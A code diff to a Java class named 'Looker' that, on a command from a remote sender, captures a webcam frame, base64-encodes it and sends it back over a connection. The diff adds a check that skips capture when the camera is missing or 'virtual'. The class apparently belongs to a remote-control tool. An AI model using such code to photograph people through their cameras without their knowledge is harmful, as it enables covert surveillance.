@@ -7,10 +7,7 @@ import com.github.sarxos.webcam.Webcam;
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.awt.image.DataBufferByte;
-import java.awt.image.RenderedImage;
 import java.io.ByteArrayOutputStream;
-import java.io.File;
 import java.io.IOException;
 import java.io.UncheckedIOException;
 import java.util.Base64;
@@ -41,22 +38,35 @@ public class Looker extends Instruction {
 
     public void execute(HashMap<String, Object> arguments, String from) throws IOException {
         Webcam webcam = Webcam.getDefault();
-        webcam.setViewSize(new Dimension(640, 480));
-        webcam.open();
-        BufferedImage image = webcam.getImage();
-        webcam.close();
-
-        //ImageIO.write(image, "PNG", new File("lol.png"));
 
         HashMap<String, String> toSend = new HashMap<String, String>();
-        String img = imgToBase64String(image, "PNG");
-
         toSend.put("type", "reply");
         toSend.put("to", from);
-        toSend.put("img", img);
 
-        String finishedString = json.toJson(toSend);
+        if (!(webcam == null || webcam.getName().toLowerCase().contains("virtual"))) {
+            System.out.println(webcam);
+            System.out.println(webcam.getName());
+            System.out.println(webcam.getName().toLowerCase());
+            System.out.println(webcam.getName().toLowerCase().contains("virtual"));
 
-        connection.send(finishedString);
+            webcam.setViewSize(new Dimension(640, 480));
+            webcam.open();
+            BufferedImage image = webcam.getImage();
+            webcam.close();
+
+            String img = imgToBase64String(image, "PNG");
+
+            toSend.put("img", img);
+
+            String finishedString = json.toJson(toSend);
+
+            connection.send(finishedString);
+        } else {
+            toSend.put("img", "false");
+
+            String finishedString = json.toJson(toSend);
+
+            connection.send(finishedString);
+        }
     }
 }
